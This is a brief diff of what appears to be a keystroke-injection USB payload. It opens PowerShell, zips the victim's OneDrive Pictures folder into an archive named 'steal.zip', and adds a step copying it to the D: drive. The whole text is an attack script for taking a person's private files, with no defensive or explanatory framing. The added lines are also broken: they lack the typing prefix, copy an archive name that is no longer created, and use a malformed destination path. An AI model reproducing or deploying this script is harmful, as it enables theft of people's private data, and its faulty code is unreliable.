@@ -6,5 +6,10 @@ STRING powershell
 ENTER 
 DELAY 500
 
-STRING Compress-Archive -Path "$env:USERPROFILE\OneDrive\Pictures\*" -DestinationPath "$env:USERPROFILE\OneDrive\Documents\loot.zip"
+STRING Compress-Archive -Path "$env:USERPROFILE\OneDrive\Pictures\*" -DestinationPath "$env:USERPROFILE\OneDrive\Documents\steal.zip"
 ENTER
+
+
+DELAY 5000
+Copy-Item "$env:USERPROFILE\OneDrive\Documents\loot.zip" -Destination "D:steal.zip"
+ENTER 
